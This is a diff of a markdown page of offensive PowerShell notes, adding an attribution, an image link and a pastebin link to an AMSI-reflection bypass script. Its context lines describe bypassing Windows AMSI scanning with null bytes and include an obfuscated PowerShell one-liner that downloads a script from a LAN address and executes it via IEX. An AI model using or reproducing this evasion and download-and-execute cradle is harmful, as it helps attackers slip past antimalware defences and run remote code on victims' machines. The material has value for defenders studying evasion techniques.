@@ -809,7 +809,7 @@ Here we can view the all process of encoding/decoding in powershell console
 
 <br /> 
 
-- **AMSI** bypass using nul bits
+- **AMSI** bypass using nul bits [Satoshi]
 
       Bypass AMSI mechanism using nul bits before the actual funtion occurs.
       For file contents, insert "#<NULL>" at the beginning of the file, and any places
@@ -826,7 +826,7 @@ Here we can view the all process of encoding/decoding in powershell console
 
       powershell Write-Host "#<NULL>"; I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.168.1.71/hello.ps1")' -f'Ne','Download','http://','lie')
 
-![enigma0x3 - AMSI Bypass](http://i63.tinypic.com/14ec6f5.jpg)
+![enigma0x3 - AMSI Bypass](http://i.cubeupload.com/fU7e51.jpg)
 
 
 - For file contents<br />
@@ -862,6 +862,8 @@ Here we can view the all process of encoding/decoding in powershell console
 <br />
 
 ![AMSI Bypass](http://i65.tinypic.com/15hzzvb.png)
+
+[11] [AMSI-Reflection.ps1](https://pastebin.com/THJQvHnU)<br />
 
 ---
 
